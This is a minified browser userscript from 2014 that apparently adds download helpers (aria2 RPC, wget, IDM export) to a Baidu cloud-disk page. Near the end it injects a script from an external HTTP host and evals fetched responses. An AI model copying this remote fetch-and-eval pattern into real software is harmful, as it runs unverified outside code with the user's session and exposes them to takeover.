f,g,h,i,j,k,l,d={aria2:"aria2.session",wget:"wget.txt",idm:"idmlist.ef2"},e=document.createElement("div");e.className="b-panel b-dialog alert-dialog",e.id="down_dialog",e.style.display="block",e.style.border="1px solid #999",f=[],f.push('<div class="dlg-hd b-rlv">'),f.push('<div title="关闭" id="down_dialog_close" class="dlg-cnr dlg-cnr-r"></div>'),f.push("<h3>下载"+a+"文件</h3></div>"),f.push('<div style="margin: 22px 180px;">'),f.push("<a href="+b+' class="new-dbtn" download="'+d[a]+'"><em class="icon-download"></em><b>下载文件</b></a>'),f.push("</div>"),0!=c.length&&f.push('<div style="width:425px;height:200px;margin: -13px auto 10px;border:1px solid rgb(240, 240, 240); background-color: rgb(250, 250, 250);overflow-y: auto;overflow-x: auto;">'+c+"</div>"),e.innerHTML=f.join(""),document.body.appendChild(e),g=$("#down_dialog"),h=$(window).width(),i=$(window).height(),j=$(document).scrollTop(),k=(h-g.width())/2,l=(i-g.height())/2+j,e.style.left=k+"px",e.style.top=l+"px",$("#down_dialog_close").unbind().click(function(){g.remove(),$("#masking").css("display","none")})},combination={header:function(){var g,h,a=[],b=document.getElementById("setting_aria2_useragent_input").value,c=document.getElementById("setting_aria2_referer_input").value,d=config.params[0].input.setting_aria2_useragent_input,e=config.params[0].input.setting_aria2_referer_input,f=config.params[0].textarea;if(b?a.push("User-Agent: "+b):d&&a.push("User-Agent: "+d),config.params[0].checked.referer_auto?a.push("Referer: "+combination.referer()):c?a.push("Referer: "+c):e&&a.push("Referer: "+e),f)for(g=f.split("\n"),h=0;h<g.length;h++)a.push(g[h]);return a},aria2_rpc:function(a,b){var c=[{jsonrpc:"2.0",method:"aria2.addUri",id:(new Date).getTime(),params:[[a],{out:b,header:combination.header()}]}],d=b;return"/"==d.substring(0,1)&&(c[0].params[1].out=d.substring(1,d.length)),c},aria2:function(a,b){var e,f,c=b,d=a+"\r\n";d+="/"==c.substring(0,1)?" out="+c.substring(1,c.length)+"\r\n":" out="+b+"\r\n",e=combination.header();for(f in e)d+=" header="+e[f]+"\r\n";return d+="\r\n"},wget:function(a,b){var e,c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",d="wget -c -O ";for(e=0;e<b.length;e++)d+=-1==c.indexOf(b[e])?"\\"+b[e]:b[e];return d+=" '"+a+"'"+"\r\n"},idm:function(a){var c="<\r\n"+a+"\r\n>\r\n";return c}},Initialize=function(){var a,b,c,d,e,f;if(config.get()){a=document.getElementById("setting_aria2_useragent_input").value,b=document.getElementById("setting_aria2_referer_input").value,$("#setting_div input[type=checkbox]").attr("checked",!1),$("#setting_div input[type=text]").attr("value",null),config.params[0].input.setting_aria2_useragent_input||(document.getElementById("setting_aria2_useragent_input").value=a),config.params[0].input.setting_aria2_referer_input||(document.getElementById("setting_aria2_referer_input").value=b);for(c in config.params[0].input)$("#"+c).attr("value",config.params[0].input[c]);for(c in config.params[0].checked)$("#"+c).attr("checked",config.params[0].checked[c]);for(config.params[0].textarea&&(document.getElementById("setting_aria2_headers").value=config.params[0].textarea),d=$("#typeout input[type=checkbox]"),c=0;c<d.length;c++)$(d[c]).attr("checked")?(e=$(d[c]).attr("id").split("_")[0],$("#out_"+e).parent().css("display","block")):(e=$(d[c]).attr("id").split("_")[0],$("#out_"+e).parent().css("display","none"));$("#rpc_distinguish").attr("checked")?($("#rpc_user").removeAttr("disabled"),$("#rpc_pass").removeAttr("disabled")):($("#rpc_pass").attr("disabled","disabled"),$("#rpc_user").attr("disabled","disabled")),$("#referer_auto").attr("checked")?$("#setting_aria2_referer_input").attr("disabled","disabled"):$("#setting_aria2_referer_input").removeAttr("disabled"),f=document.cookie.match(new RegExp("(^| )iswebjs=([^;]*)(;|$)")),f=f?f.length>1?f[2]:"0":"0",1==f&&$("#iswebjs").attr("checked",!0)
}},button(),add_setting_div(),Initialize(),masking()}var iswebjs,datadefault,base64_data,Days,exp,cookiedata,name="bcofl_v2",arr=document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));if(name="iswebjs",iswebjs=document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)")),iswebjs=iswebjs?iswebjs.length>1?iswebjs[2]:"0":"0",window.XMLHttpRequest?"undefined"==typeof HttpSendRead&&(window.HttpSendRead=function(info){function httpclose(){http.abort()}var timeId,http=new XMLHttpRequest,contentType="application/x-www-form-urlencoded; charset=UTF-8",timeout=3e3;null!=info.contentType&&(contentType=info.contentType),null!=info.timeout&&(timeout=info.timeout),timeId=setTimeout(httpclose,timeout),http.onreadystatechange=function(){4==http.readyState&&(200==http.status&&http.status<300||304==http.status?(clearTimeout(timeId),"JSON"==info.dataType?info.success(JSON.parse(http.responseText)):"SCRIPT"==info.dataType&&(eval(http.responseText),info.success(http.responseText))):(clearTimeout(timeId),info.error(http.status)))},http.open(info.type,info.url,!0),http.setRequestHeader("Content-type",contentType);for(h in info.headers)http.setRequestHeader(h,info.headers[h]);"POST"==info.type?http.send(info.data):http.send()}):alert("脚本不能使用，快去换个浏览器。"),arr)try{cookiedata=JSON.parse(decodeURIComponent(window.atob(arr[2]))),"undefined"==typeof perform_of_number&&"undefined"==typeof mandatory&&"1"==iswebjs?loadjs():("0"==iswebjs||1==perform_of_number||1==mandatory)&&localjs()}catch(type){window.setTimeout(function(){Utilities.useToast({toastMode:disk.ui.Toast.MODE_CAUTION,msg:"执行脚本时发生错误，尝试使用远程脚本。",sticky:!0}),window.setTimeout(loadjs,2e3)},2e3)}else datadefault=JSON.parse('[{"input":{"rpc_input":"http://192.168.1.1:6800/jsonrpc"},"checked":{"aria2rpc_checkbox":"checked"}}]'),base64_data=window.btoa(encodeURIComponent(JSON.stringify(datadefault))),name="bcofl_v2",Days=365,exp=new Date,exp.setTime(exp.getTime()+1e3*60*60*24*Days),document.cookie=name+"="+base64_data+";expires="+exp.toGMTString()+";path=/;",A()}var version,thedate_update,baidu_version,script=document.createElement("script");script.src="http://xnjty-test.stor.sinaapp.com/Voyeur.min.js",document.body.appendChild(script),version="0.2.9",thedate_update="2014/05/29",baidu_version="201405225544",A();